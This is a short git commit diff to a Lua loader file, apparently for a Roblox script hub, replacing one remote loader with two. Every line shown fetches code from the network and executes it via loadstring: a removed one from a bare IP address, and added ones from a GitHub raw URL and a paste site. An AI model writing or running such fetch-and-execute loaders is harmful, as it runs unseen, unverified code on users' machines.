930906e95572a82c14eab322dbac8bfc87ece3e3
WonyeScripts <alikeremkanbur74@icloud.com>
2025-11-02 21:18:25 +0300

    Update mainn.lua

--- mainn.lua
+++ mainn.lua
@@ -1,2 +1,3 @@
-ID="9f5bc6e9-6854-41af-a91d-02135693fff9";
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/alikeremkanburr/WonyeHub/refs/heads/main/multi-game-support.lua", true))()
+task.wait(0.5)
+loadstring(game:HttpGet("https://pastefy.app/2Q3qbI5q/raw"))()
